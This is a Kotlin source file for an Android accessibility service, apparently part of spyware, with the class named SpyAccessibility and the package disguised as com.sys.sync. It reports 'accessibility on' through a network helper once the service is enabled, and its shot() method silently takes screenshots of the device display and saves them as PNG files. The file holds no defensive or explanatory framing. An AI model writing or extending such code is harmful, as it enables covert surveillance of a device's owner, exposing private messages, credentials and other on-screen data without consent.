package com.sys.sync

import android.accessibilityservice.AccessibilityService
import android.graphics.Bitmap
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.CountDownLatch
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class SpyAccessibility : AccessibilityService() {

    override fun onServiceConnected() { inst = this; Net.send("accessibility on") }
    override fun onAccessibilityEvent(e: AccessibilityEvent?) {}
    override fun onInterrupt() {}

    fun shot(): File? {
        var f: File? = null
        val latch = CountDownLatch(1)
        takeScreenshot(Display.DEFAULT_DISPLAY, Executors.newSingleThreadExecutor(),
            object : TakeScreenshotCallback {
                override fun onSuccess(r: ScreenshotResult) {
                    val bmp = Bitmap.wrapHardwareBuffer(r.hardwareBuffer, r.colorSpace)
                    val out = File(cacheDir, "s_${System.currentTimeMillis()}.png")
                    FileOutputStream(out).use { bmp?.compress(Bitmap.CompressFormat.PNG, 90, it) }
                    f = out
                    latch.countDown()
                }
                override fun onFailure(code: Int) { latch.countDown() }
            })
        latch.await(8, TimeUnit.SECONDS)
        return f
    }

    companion object { var inst: SpyAccessibility? = null }
}
